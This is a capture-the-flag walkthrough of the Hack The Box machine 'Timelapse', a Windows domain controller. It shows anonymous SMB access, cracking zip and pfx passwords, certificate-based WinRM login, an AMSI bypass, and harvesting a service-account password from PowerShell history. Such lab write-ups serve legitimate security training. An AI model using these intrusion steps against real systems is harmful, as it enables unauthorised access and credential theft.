+++
title = "Timelapse"
date = "2024-01-01"
description = "This is an easy Windows box."
[extra]
cover = "cover.png"
toc = true
+++

# Information

**Difficulty**: Easy

**OS**: Windows

**Release date**: 2022-03-26

**Created by**: [ctrlzero](https://app.hackthebox.com/users/168546)

# Setup

I'll attack this box from a Kali Linux VM as the `root` user — not a great practice security-wise, but it's a VM so it's alright. This way I won't have to prefix some commands with `sudo`, which gets cumbersome in the long run. Heck, it's hard enough to remember the flags for the commands without needing to know the privileges required to run them too!

I like to maintain consistency in my workflow for every box, so before starting with the actual pentest, I'll prepare a few things:

1. I'll create a directory that will contain every file related to this box. I'll call it `workspace`, and it will be located at the root of my filesystem `/`.

1. I'll create a `server` directory in `/workspace`. Then, I'll run `httpsimpleserver` to create an HTTP server and `impacket-smbserver` to create an SMB share named `server`. This will make files in this folder available over the Internet, which will be especially useful for transferring files to the target machine if need be!

1. I'll place all my tools and binaries into the `/workspace/server` directory. This will come in handy once we get a foothold, for privilege escalation and for pivoting inside the internal network.

I'll also strive to minimize the use of Metasploit, because it hides the complexity of some exploits, and prefer a more manual approach when it's not too much hassle to really understand what's happening on the machine.

Throughout this write-up, my machine's IP address will be `10.10.14.30`, while the target machine's IP address will be `10.10.11.152`. The commands ran on my machine will be prefixed with `❯` for clarity, and if I ever need to transfer files or binaries to the target machine I'll always place them in the `/tmp` or `C:\tmp` folder to clean up more easily later on.

Now we should be ready to go!

# Remote enumeration

## Host discovery

Well, we already know the IP we are targeting, so this phase is actually empty!

## TCP port scanning

As usual, I'll initiate a port scan on Timelapse using a TCP SYN `nmap` scan to assess its attack surface.

```sh
❯ nmap -sS 10.10.11.152 -p-
```

```
<SNIP>
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49729/tcp open  unknown
53096/tcp open  unknown
<SNIP>
```

## Service fingerprinting

Following the port scan, let's gather more data about the services associated with the open ports we found.

```sh
❯ nmap -sS 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,3269,5986 -sV
```

```
<SNIP>
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-01 17:29:23Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5986/tcp open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP>
```

Alright, so `nmap` managed to determine that Toolbox is running Windows. That's good to know!

These open ports typically correspond to a DC. This is confirmed by `nmap`, as Timelapse's hostname is `DC01`.

## Scripts

Let's run `nmap`'s default scripts on these services to see if they can find additional information.

```sh
❯ nmap -sS 10.10.11.152 -p 53,88,135,139,389,445,464,593,636,3268,3269,5986 -sC
```

```
<SNIP>
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5986/tcp open  wsmans
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_ssl-date: 2024-01-01T17:30:28+00:00; +7h59m58s from scanner time.

Host script results:
| smb2-time: 
|   date: 2024-01-01T17:30:29
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m57s
<SNIP>
```

Nothing crazy here.

Let's start by exploring SMB.

## SMB (port `445/tcp`)

### Anonymous login

We can try to connect to the SMB server as the `NULL` user. With a bit of luck, this will work!

```sh
❯ smbclient -L //10.10.11.152 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share 
Shares          Disk      
SYSVOL          Disk      Logon server share
<SNIP>
```

It did!

The only non-default administrative share is `Shares`. It might be worth digging into!

### Exploring `Shares`

Let's mount this share on our machine to explore it more efficiently.

```sh
❯ smbclient //10.10.11.152/Shares -N -c "lcd /workspace/smb; prompt; recurse; mget *"
```

```
<SNIP>
```

Now let's see what this share contains.

```sh
❯ tree -a /workspace/smb
```

```
/workspace/smb
├── Dev
│   └── winrm_backup.zip
└── HelpDesk
    ├── LAPS.x64.msi
    ├── LAPS_Datasheet.docx
    ├── LAPS_OperationsGuide.docx
    └── LAPS_TechnicalSpecification.docx

<SNIP>
```

Both of the folders in this share seem to contain interesting files, so let's focus on `Dev` first. It contains a `winrm_backup.zip` file.

### Enumerating `winrm_backup.zip`

Let's get the content of this file:

```sh
❯ unzip -l /workspace/smb/Dev/winrm_backup.zip
```

```
  Length      Date    Time    Name
---------  ---------- -----   ----
     2555  2021-10-25 16:21   legacyy_dev_auth.pfx
---------                     -------
     2555                     1 file
```

Okay, so it contains a `legacyy_dev_auth.pfx` file. Let's unzip it now:

```sh
❯ unzip /workspace/smb/Dev/winrm_backup.zip -d /workspace/
```

```
Archive:  /workspace/smb/Dev/winrm_backup.zip
[/workspace/smb/Dev/winrm_backup.zip] legacyy_dev_auth.pfx password:
```

We need a password for that...

### Hash cracking

Let's extract the password hash from the `.zip` file:

```sh
❯ zip2john /workspace/smb/Dev/winrm_backup.zip > /workspace/zip.hash
```

```
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```

Alright! Not let's use `john` with the `rockyou` wordlist to crack it.

```sh
❯ john /workspace/zip.hash -wordlist=/usr/share/wordlists/rockyou.txt
```

```
<SNIP>
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
<SNIP>
```

It found a password: `supremelegacy`!

### Enumerating `winrm_backup.zip`

Let's go back to our enumeration of `winrm_backup.zip`. This time, we should be able to unzip it!

```sh
❯ unzip /workspace/smb/Dev/winrm_backup.zip -d /workspace/
```

```
Archive:  /workspace/smb/Dev/winrm_backup.zip
[/workspace/smb/Dev/winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: /workspace/legacyy_dev_auth.pfx
```

The password worked! Now we have a `legacyy_dev_auth.pfx` to work with. But... what's that file extension?

If we search online, we find that a `.pfx` file is used to store a certificate and its private key. It is often used for securely exchanging public and private key pairs between different systems, or for importing and exporting certificates and private keys within a single system.

### Enumerating `legacyy_dev_auth.pfx`

Okay, so let's try to extract keys from it.

```sh
❯ openssl pkcs12 -in /workspace/legacyy_dev_auth.pfx -out /workspace/legacyy_dev_auth.key.enc -nocerts
```

```
Enter Import Password:
```

We need a password... again!

### Hash cracking

Let's extract the password hash from the `.pfx` file:

```sh
❯ pfx2john /workspace/legacyy_dev_auth.pfx > /workspace/pfx.hash
```

Alright! Not once again, let's use `john` with the `rockyou` wordlist to crack it.

```sh
❯ john /workspace/pfx.hash -wordlist=/usr/share/wordlists/rockyou.txt
```

```
<SNIP>
thuglegacy       (legacyy_dev_auth.pfx)
<SNIP>
```

It found a password: `thuglegacy`!

### Enumerating `legacyy_dev_auth.pfx`

Let's go back to our enumeration of `legacyy_dev_auth.pfx`. This time, we should be able to extract the keys!

```sh
❯ openssl pkcs12 -in /workspace/legacyy_dev_auth.pfx -out /workspace/legacyy_dev_auth.key.enc -nocerts
```

```
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
```

I entered `my5up3r53cr37p455w0rd` for the PEM passphrase.

For convenience, let's decrypt the key. That way, we won't need to enter the password every set amount of time.

```sh
❯ openssl rsa -in /workspace/legacyy_dev_auth.key.enc -out /workspace/legacyy_dev_auth.key
```

```
Enter pass phrase for /workspace/legacyy_dev_auth.key.enc:
writing RSA key
```

Now let's retrieve the certificate.

```sh
❯ openssl pkcs12 -in /workspace/legacyy_dev_auth.pfx -out /workspace/legacyy_dev_auth.crt -clcerts -nokeys
```

```
Enter Import Password:
```

Okay, so now we have a decrypted private key and a certificate.

# Foothold (WinRM)

Let's use the private key and the certificate we obtained to connect to Timelapse over WinRM!

```sh
❯ evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
```

```
<SNIP>
Enter PEM pass phrase:
*Evil-WinRM* PS C:\Users\legacyy\Documents>
```

We got a shell!

# Local

If we run `whoami`, we see that we got a foothold as `legacyy`.

## Version

Let's gather some information about the Windows version of Timelapse.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    ProductName    REG_SZ    Windows Server 2019 Standard
```

Okay, so this is Windows Server 2019!

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentBuildNumber
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
    CurrentBuildNumber    REG_SZ    17763
```

And this is build `17763`.

This version of Windows is pretty recent, so we're unlikely to find any serious vulnerability here. But maybe there are missing hotfixes. We'll check that later, if we can't find another way to get `NT AUTHORITY\SYSTEM`.

## Architecture

What is Timelapse's architecture?

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v PROCESSOR_ARCHITECTURE
```

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
    PROCESSOR_ARCHITECTURE    REG_SZ    AMD64
```

So this system is using x64. This will be useful to know if we want to compile our own exploits.

## Windows Defender

Let's check if Windows Defender is enabled.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender" /v ProductStatus
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender
    ProductStatus    REG_DWORD    0x0
```

It's disabled! That's great, it will make our life easier.

## AMSI

Let's check if there's any AMSI provider.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers"
```

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}
```

There's an AMSI provider! Let's disable it then.

```ps1
*Evil-WinRM* PS *Evil-WinRM* PS C:\Users\legacyy\Documents> Bypass-4MSI
```

```
Info: Patching 4MSI, please be patient...
                                        
[+] Success!
```

That's better!

## Firewall

Let's see which Windows Firewall policies profiles are enabled.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy" /s /v EnableFirewall
```

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile
    EnableFirewall    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile
    EnableFirewall    REG_DWORD    0x1

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile
    EnableFirewall    REG_DWORD    0x1

<SNIP>
```

Okay, so all Firewall profiles are enabled. It shouldn't hinder our progression too much though: since we alreay managed to obtain a reverse shell, the protections should be really basic.

## NICs

Let's gather the list of connected NICs.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> ipconfig /all
```

```
Windows IP Configuration

   Host Name . . . . . . . . . . . . : dc01
   Primary Dns Suffix  . . . . . . . : timelapse.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : timelapse.htb
                                       htb

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-CF-01
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::1d8(Preferred) 
   Lease Obtained. . . . . . . . . . : Tuesday, January 2, 2024 8:38:57 AM
   Lease Expires . . . . . . . . . . : Tuesday, January 2, 2024 9:38:57 AM
   IPv6 Address. . . . . . . . . . . : dead:beef::d542:3482:ba35:709c(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::d542:3482:ba35:709c%13(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.11.152(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:25b7%13
                                       10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 33574998
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2D-25-F4-73-00-50-56-B9-CF-01
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
```

Looks like there's a single network.

## Local users

Let's enumerate all local users using `PowerView`.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-NetLocalGroupMember -GroupName Users | Where-Object { $_.MemberName -notmatch 'NT AUTHORITY' } | Select-Object GroupName, MemberName, SID | Format-Table
```

```
GroupName MemberName             SID
--------- ----------             ---
Users     TIMELAPSE\Domain Users S-1-5-21-671920749-559770252-3318990721-513
```

It looks like there's only domain users.

## Domain users

Let's get the domain users then.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-DomainUser | Select-Object Name, Description, ObjectSID | Format-Table
```

```
name          description                                              objectsid
----          -----------                                              ---------
Administrator Built-in account for administering the computer/domain   S-1-5-21-671920749-559770252-3318990721-500
Guest         Built-in account for guest access to the computer/domain S-1-5-21-671920749-559770252-3318990721-501
krbtgt        Key Distribution Center Service Account                  S-1-5-21-671920749-559770252-3318990721-502
TheCyberGeek                                                           S-1-5-21-671920749-559770252-3318990721-1601
Payl0ad                                                                S-1-5-21-671920749-559770252-3318990721-1602
Legacyy                                                                S-1-5-21-671920749-559770252-3318990721-1603
Sinfulz                                                                S-1-5-21-671920749-559770252-3318990721-1604
Babywyrm                                                               S-1-5-21-671920749-559770252-3318990721-1605
svc_deploy                                                             S-1-5-21-671920749-559770252-3318990721-3103
TRX                                                                    S-1-5-21-671920749-559770252-3318990721-5101
```

Okay, so got a foothold as a domain user. There's also a few other domain users.

## Local groups

Let's enumerate all local groups, once again using `PowerView`.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-NetLocalGroup | Select-Object GroupName, Comment | Format-Table | Out-String -Width 4096
```

```
GroupName                               Comment
---------                               -------
Server Operators                        Members can administer domain servers
Account Operators                       Members can administer domain user and group accounts
Pre-Windows 2000 Compatible Access      A backward compatibility group which allows read access on all users and groups in the domain
Incoming Forest Trust Builders          Members of this group can create incoming, one-way trusts to this forest
Windows Authorization Access Group      Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
Terminal Server License Servers         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
Administrators                          Administrators have complete and unrestricted access to the computer/domain
Users                                   Users are prevented from making accidental or intentional system-wide changes and can run most applications
Guests                                  Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
Print Operators                         Members can administer printers installed on domain controllers
Backup Operators                        Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
Replicator                              Supports file replication in a domain
Remote Desktop Users                    Members in this group are granted the right to logon remotely
Network Configuration Operators         Members in this group can have some administrative privileges to manage configuration of networking features
Performance Monitor Users               Members of this group can access performance counter data locally and remotely
Performance Log Users                   Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
Distributed COM Users                   Members are allowed to launch, activate and use Distributed COM objects on this machine.
IIS_IUSRS                               Built-in group used by Internet Information Services.
Cryptographic Operators                 Members are authorized to perform cryptographic operations.
Event Log Readers                       Members of this group can read event logs from local machine
Certificate Service DCOM Access         Members of this group are allowed to connect to Certification Authorities in the enterprise
RDS Remote Access Servers               Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
RDS Endpoint Servers                    Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
RDS Management Servers                  Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
Hyper-V Administrators                  Members of this group have complete and unrestricted access to all features of Hyper-V.
Access Control Assistance Operators     Members of this group can remotely query authorization attributes and permissions for resources on this computer.
Remote Management Users                 Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
Storage Replica Administrators          Members of this group have complete and unrestricted access to all features of Storage Replica.
Cert Publishers                         Members of this group are permitted to publish certificates to the directory
RAS and IAS Servers                     Servers in this group can access remote access properties of users
Allowed RODC Password Replication Group Members in this group can have their passwords replicated to all read-only domain controllers in the domain
Denied RODC Password Replication Group  Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
DnsAdmins                               DNS Administrators Group
```

Nothing extraordinary for a DC.

## User account information

Let's gather more information about us.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> net user legacyy
```

```
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/5/2024 7:11:58 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
<SNIP>
```

We don't belong to interesting groups.

## Home folder

If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.

```ps1
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\Desktop\user.txt
```

```
TODO
```

Apart from this file, there's nothing out of the ordinary.

## Command history

Let's check the commands previously ran by our user.

```ps1
*Evil-WinRM* PS C:\Users\legacyy> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

It looks like our user connected to this machine as `svc_deploy` using the password `E3R$Q62^12p7PLlC%KWaxuaV`!

# Lateral movement (WinRM)

Let's connect to Timelapse as `svc_deploy` using WinRM.